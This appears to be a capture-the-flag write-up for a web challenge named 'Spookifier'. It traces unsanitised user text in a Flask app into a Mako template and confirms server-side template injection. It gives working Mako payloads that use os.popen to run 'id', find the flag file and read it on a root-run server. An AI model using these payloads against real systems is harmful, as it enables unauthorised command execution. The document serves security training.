
- We have a web application, in which we can input a text and it is being changed into 4 texts with 4 different fonts![[Pasted image 20250826121752.png]]
- We are also provided with a bunch of files, which are the copies of the web application files 

- In the `/web_spookifier/challenge` we have a file `run.py` with the contents
```python
from application.main import app

app.run(host='0.0.0.0', port=1337, debug=False, use_evalex=False)
```
- So we go to the `main.py` file in the application directory
![[Pasted image 20250826124348.png]]
- 2 things we observe here:
	- first, we have to go to `/application/blueprints/routes` to see the contents
	- second, the application uses `Mako` which can lead to `SSTI` - `Server Side Template Injection`

- We go to the `/routes.py` which leads us to the `/application/util.py` file to the `spokify` function![[Pasted image 20250826124939.png]]

- The `util.py` file contains the code that changes the text ![[Pasted image 20250826125045.png]]

- We can observe that the `spookify` uses the `change_font` function which changes the original text in every of the 4 fonts
- The things I observe is that:
	- there is no input sanitization 
	- the `font4` is unchanged and allows special characters

- So from the things we learned until now, I deduce that I can use SSTI because the app runs the `mako` template engine and the output will be provided in the 4th font
![[Pasted image 20250826125702.png]]
- Checking for `SSTI` it confirms that we can use that

- With the help of this website https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation I found a command with which I can use `popen` to run commands on the target server
- Running the `id` command:
```python
${self.module.cache.util.os.popen("id").read()}
```
![[Pasted image 20250826130139.png]]
- I observe that the server runs as the `root` user

- Next let's use the `find` command to search for the `flag.txt` file
```python
${self.module.cache.util.os.popen("find / -name flag.txt 2>/dev/null").read()}
```
![[Pasted image 20250826130351.png]]

- Finally we check the output of the `flag.txt` file
```python
${self.module.cache.util.os.popen("cat /flag.txt").read()}
```
![[Pasted image 20250826130502.png]]
